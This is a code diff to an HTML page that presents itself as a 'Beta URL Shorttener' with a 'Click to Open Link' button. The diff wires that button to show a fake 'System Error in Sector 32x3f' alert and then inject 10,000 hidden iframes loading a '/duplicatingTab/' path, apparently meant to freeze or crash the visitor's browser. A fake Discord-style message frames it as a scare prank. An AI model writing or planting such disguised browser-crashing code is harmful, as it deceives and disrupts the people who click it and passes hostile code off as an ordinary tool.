@@ -36,15 +36,18 @@
 					Bet you thought about getting away with it but atlas, we took notice.
 				</discord-message>`;
 		}
-		function openTabs() {
-			alert("System Error in Sector 32x3f");
+		function crashLol() {
 			for (var i = 0; i < 10000; i++) {
 			  document.body.innerHTML += '<iframe height="0" width="0" src="/duplicatingTab/" title="Duplicating Tab"></iframe>';
 		  }
 		}
+		function yourComputerHazVirus() {
+			setTimeout(crashLol, 500);
+			alert("System Error in Sector 32x3f");
+		}
 	</script>
 	
 	<h1 class="remove">Beta URL Shorttener</h1>
-	<input class="remove" type=button value="Click to Open Link" onclick="setTimeout(() => openTabs(), 5000); addMessagesOne();">
+	<input class="remove" type=button value="Click to Open Link" onclick="setTimeout(() => yourComputerHazVirus(), 5000); addMessagesOne();">
 </body>
 </html>
